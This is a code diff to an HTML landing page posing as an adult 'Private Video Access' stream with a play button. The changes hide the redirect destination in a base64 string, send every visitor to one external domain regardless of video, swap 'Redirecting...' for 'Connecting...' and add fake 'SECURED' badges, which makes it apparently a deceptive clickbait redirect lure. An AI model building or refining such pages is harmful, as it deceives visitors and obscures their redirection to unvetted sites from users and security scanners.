@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="referrer" content="no-referrer">
-    <title>Stream Portal | Secure Access</title>
+    <title>Private Access | Secure Stream</title>
     
     <meta property="og:title" content="Private Video Access" />
     <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
@@ -93,13 +93,12 @@
             pointer-events: none;
         }
 
-        /* ----- EDIT BLUR VIDEO DI BAWAH INI ----- */
         #bgVideo {
             width: 100%;
             height: 100%;
             object-fit: cover;
             opacity: 0.50; 
-            filter: blur(20px); /* <--- Ubah nilai PX ini */
+            filter: blur(20px); 
             transform: scale(1.2);
             transition: opacity 1.2s ease;
         }
@@ -130,7 +129,6 @@
                 <div class="video-obscurer"></div>
                 <div class="scanlines"></div>
                 
-                <!-- Blur gambar fallback juga bisa diubah di class blur-[30px] -->
                 <img id="vidThumb" class="absolute inset-0 w-full h-full object-cover opacity-40 blur-[30px]" src="https://vidley.pw/tombolplay.jpg" alt="Preview">
                 <video id="bgVideo" autoplay muted loop playsinline class="opacity-0"></video>
             </div>
@@ -139,7 +137,7 @@
                 
                 <div class="mb-12 flex flex-col items-center">
                      <span class="age-badge mb-3 shadow-[0_0_10px_rgba(220,38,38,0.3)]">18+</span>
-                     <p class="text-red-500/80 text-[10px] uppercase tracking-[0.4em] font-black">ADULT ONLY CONTENT</p>
+                     <p class="text-red-600 text-[10px] uppercase tracking-[0.4em] font-black">ADULT ONLY CONTENT</p>
                 </div>
 
                 <div id="iconBox" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_40px_rgba(220,38,38,0.4)] pulse-red group-hover:scale-110 transition-all duration-300">
@@ -147,22 +145,23 @@
                 </div>
 
                 <div class="mt-12 text-center px-6">
-                    <p class="text-white/40 text-[10px] font-bold tracking-[0.2em] uppercase">Tap to watch</p>
+                    <p class="text-white/20 text-[9px] font-bold tracking-[0.2em] uppercase italic">TAP TO WATCH</p>
                 </div>
             </div>
             
             <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-black/95 z-40 backdrop-blur-md">
                 <div class="flex flex-col items-center">
                     <div class="spinner-ring mb-5"></div>
-                    <span class="text-red-600 text-[9px] font-black tracking-[0.5em] uppercase animate-pulse">Redirecting...</span>
+                    <span class="text-red-600 text-[9px] font-black tracking-[0.5em] uppercase animate-pulse">Connecting...</span>
                 </div>
             </div>
         </div>
 
         <div class="py-5 bg-black flex flex-col items-center border-t border-red-900/30">
             <div class="flex justify-center gap-5 text-white/30 text-[8px] font-black uppercase tracking-[0.25em]">
-                <span class="flex items-center gap-1.5"><i data-lucide="shield" class="w-3 h-3 text-red-600"></i> ENCRYPTED</span>
-                <span class="flex items-center gap-1.5"><i data-lucide="zap" class="w-3 h-3 text-red-600"></i> 1.0GBPS</span>
+                <span class="flex items-center gap-1.5"><i data-lucide="shield-check" class="w-3 h-3 text-red-600"></i> SECURED</span>
+                <span class="flex items-center gap-1.5"><i data-lucide="globe" class="w-3 h-3 text-red-600"></i> US-WEST</span>
+                <span class="flex items-center gap-1.5"><i data-lucide="zap" class="w-3 h-3 text-red-600"></i> FAST</span>
             </div>
         </div>
     </div>
@@ -170,7 +169,7 @@
     <script>
         lucide.createIcons();
 
-        const MAIN_URL = "https://mov.vidley.pw"; 
+        const MAIN_URL = atob("aHR0cHM6Ly9tLnZpZGxleS5wdy8=");
 
         function getVideoId() {
             let path = window.location.pathname.split('/').pop().trim();
@@ -214,9 +213,6 @@
 
             setTimeout(() => {
                 let target = MAIN_URL;
-                if (vId) {
-                    target = MAIN_URL.endsWith('/') ? MAIN_URL + vId : MAIN_URL + '/' + vId;
-                }
                 window.location.href = target;
             }, 1000);
         }
